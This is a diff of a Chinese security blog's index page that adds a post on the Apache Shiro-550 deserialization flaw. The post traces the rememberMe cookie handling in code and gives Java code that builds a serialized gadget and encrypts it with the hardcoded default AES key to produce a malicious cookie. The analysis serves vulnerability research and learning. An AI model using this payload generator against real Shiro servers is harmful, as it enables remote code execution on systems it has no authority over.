@@ -175,6 +175,122 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/04/Shiro550/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ky0127">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/02/04/Shiro550/" class="post-title-link" itemprop="url">Shiro550反序列化</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-02-04 20:10:17 / Modified: 20:11:43" itemprop="dateCreated datePublished" datetime="2022-02-04T20:10:17+08:00">2022-02-04</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Java%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Java安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+
+
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>这个漏洞产生的原因是请求Shiro时携带rememberMe为键的Cookie，到达目标服务器之后会对这个Cookie值先Base64解密然后AES解密，最后把解密出来的结果进行反序列化操作。</p>
+<p>而Shiro早先版本中的AES加解密所用密钥是写在源码中的，也就是我们可以把反序列化构造好之后Base64加密然后用密钥AES加密发送给Shiro，最后到达目标服务器之后Shiro会解密传过来的Cookie值并反序列化进而触发Gadget。</p>
+<h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><p>Shiro在 <code>CookieRememberMeManager#rememberSerializedIdentity</code> 方法进行AES加密后写入Cookie，在这个方法下断点然后随便一个账号登录并使用记住我功能，这时程序会停在这个方法。</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220204170529790.png" alt="image-20220204170529790"></p>
+<p>回溯到 <code>AuthenticatingFilter#executeLogin</code> 方法，创建 <code>AuthenticationToken</code> 和 <code>Subject</code> 对象，调用 <code>login</code> 方法</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220204170756994.png" alt="image-20220204170756994"></p>
+<p>跟进之后继续调用 <code>DefaultSecurityManager#login</code> 方法</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220204171119890.png" alt="image-20220204171119890"></p>
+<p><code>authenticate</code> 方法判断是否存在 <code>root/secret</code> 这个用户，存在则调用 <code>onSuccessfulLogin</code> 方法，不存在则调用 <code>onFailedLogin</code> 方法，跟进 <code>onSuccessfulLogin</code> 方法，此方法又调用 <code>rememberMeSuccessfulLogin</code> 方法</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220204171357510.png" alt="image-20220204171357510"></p>
+<p>这里先获取一个 <code>RememberMeManager</code> 对象，然后调用这个对象的 <code>onSuccessfulLogin</code> 方法，跟进 <code>onSuccessfulLogin</code> 方法</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220204171528218.png" alt="image-20220204171528218"></p>
+<p><code>forgetIdentity</code> 方法清除之前的Cookie，然后判断是否使用了记住我功能，如果使用了则调用 <code>rememberIdentity</code> 方法，跟进 <code>rememberIdentity</code> 方法</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220204171643541.png" alt="image-20220204171643541"></p>
+<p>获取 <code>PrincipalCollection</code> 对象，然后调用 <code>rememberIdentity</code> 方法，跟进此方法</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220204171920244.png" alt="image-20220204171920244"></p>
+<p><code>convertPrincipalsToBytes</code> 方法进行的加密操作，先把需要加密的内容序列化然后调用 <code>encrypt</code> 方法进行加密，跟进一下 <code>encrypt</code> 方法</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220204172116236.png" alt="image-20220204172116236"></p>
+<p>通过 <code>getEncryptionCipherKey</code> 方法获取加密密钥，通过观察是通过 <code>AbstractRememberMeManager-&gt;setCipherKey-&gt;setEncryptionCipherKey</code> 方法调用链设置加密密钥的</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220204172351658.png" alt="image-20220204172351658"></p>
+<p>密钥是写在源码里的，那么也就是可以自己加密任意的数据了，AES加密之后进入 <code>rememberSerializedIdentity</code> 方法。</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220204172520920.png" alt="image-20220204172520920"></p>
+<p>把加密出来的数据进行Base64编码然后写入到Cookie中</p>
+<h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><p>在 <code>AbstractRememberMeManager#getRememberedPrincipals</code> 方法下断点，打一个payload过去，程序会停在这个方法上</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220204173145240.png" alt="image-20220204173145240"></p>
+<p>跟进 <code>getRememberedSerializedIdentity</code> 方法</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220204173241887.png" alt="image-20220204173241887"></p>
+<p>先获取Cookie值然后判断这个值是否为delete，如果是则直接返回否则Base64解码之后直接返回。回到 <code>getRememberedPrincipals</code> 方法，获取Base64解码的值之后调用 <code>convertBytesToPrincipals</code> 方法，跟进这个方法</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220204190247635.png" alt="image-20220204190247635"></p>
+<p>调用 <code>decrypt</code> 方法AES解密，跟进一下这个方法</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220204190339343.png" alt="image-20220204190339343"></p>
+<p>可以看到获取密钥也是通过 <code>getDecryptionCipherKey</code> 方法获取的，跟前面加密的密钥是同一个。</p>
+<p>回到 <code>convertBytesToPrincipals</code> 方法，调用 <code>deserialize</code> 方法对AES解密之后的数据进行反序列化操作</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220204190536205.png" alt="image-20220204190536205"></p>
+<h2 id="payload编写"><a href="#payload编写" class="headerlink" title="payload编写"></a>payload编写</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Jasetol.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.Jasetol.utils.ParseArgs;</span><br><span class="line"><span class="keyword">import</span> com.Jasetol.utils.SerWithUnSer;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Shiro550</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] getByte() <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//Object object = (PriorityQueue) CommonsBeanutils.getObject();</span></span><br><span class="line">        Object object = URLDNS.getObject();</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = SerWithUnSer.serialize(object);</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        ParseArgs.parseArgs(args);</span><br><span class="line">        <span class="keyword">byte</span>[] plaintext = getByte();</span><br><span class="line">        <span class="keyword">byte</span>[] key = Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        String payload = encryptAes(plaintext, key);</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">encryptAes</span><span class="params">(<span class="keyword">byte</span>[] plaintext,<span class="keyword">byte</span>[] key)</span></span>&#123;</span><br><span class="line">        AesCipherService aesCipherService = <span class="keyword">new</span> AesCipherService();</span><br><span class="line">        ByteSource encrypt = aesCipherService.encrypt(plaintext, key);</span><br><span class="line">        <span class="keyword">return</span> encrypt.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/ky0103/Jasetol">代码地址</a></p>
+<h2 id="payload的局限"><a href="#payload的局限" class="headerlink" title="payload的局限"></a>payload的局限</h2><p>Shiro 在 ClassResolvingObjectInputStream 类上重写了 <code>ObjectInputStream#resolveClass</code> 方法，在前面的 Java readObject 方法分析中了解到这个 <code>resolveClass</code> 方法是用来获取 Class 对象的，这里重写了之后的方法用 <code>ClassUtils#forName</code> 获取 Class 对象</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220204194219395.png" alt="image-20220204194219395"></p>
+<p>跟进一下这个 <code>ClassUtils#forName</code> 方法，这个方法通过 <code>ClassUtils#loadClass</code> 加载 Class 对象，这里用 ClassLoader 进行加载的，而这个加载是不可以加载数组型的 Class 的，那么用 <code>Transformer[]</code> 数组构造的CommonsCollections01 等这些反序列化链就用不了了。</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220204194816645.png" alt="image-20220204194816645"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <div>
+      
+    </div>
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/04/CVE20173248andCVE20182628andCVE20182893/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -289,10 +405,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2022-02-03 23:06:12 / Modified: 23:33:02" itemprop="dateCreated datePublished" datetime="2022-02-03T23:06:12+08:00">2022-02-03</time>
+              <time title="Created: 2022-02-03 23:06:12" itemprop="dateCreated datePublished" datetime="2022-02-03T23:06:12+08:00">2022-02-03</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-02-04 20:11:24" itemprop="dateModified" datetime="2022-02-04T20:11:24+08:00">2022-02-04</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -318,7 +440,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="Registry与DGC的攻击利用"><a href="#Registry与DGC的攻击利用" class="headerlink" title="Registry与DGC的攻击利用"></a>Registry与DGC的攻击利用</h1><p>在 WebLogic 反序列化漏洞的绕过方式中利用到了 RMI 方面的知识，加上对 RMI 方面的攻击不是很了解，就有了这篇文章。</p>
+          <p>在 WebLogic 反序列化漏洞的绕过方式中利用到了 RMI 方面的知识，加上对 RMI 方面的攻击不是很了解，就有了这篇文章。</p>
 <h1 id="Registry"><a href="#Registry" class="headerlink" title="Registry"></a>Registry</h1><p>Registry 指的是 RMI 的注册表，攻击的目标是注册表所在的机器，一般注册表和 RMI Server 在同一个机器上，特殊情况下也会在不同机器上。</p>
 <p>在我们通过 <code>LocateRegistry#getRegistry</code> 获取到目标开启的注册表之后，可以通过 <code>Registry#bind</code> 方法绑定一个对象到注册表上，而我们绑定的对象传送到目标机器上之后会对其进行一个反序列化。</p>
 <p>反序列化触发点在 <code>RegistryImpl_Skel#dispatch</code> 方法上。</p>
@@ -858,7 +980,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-count">6</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
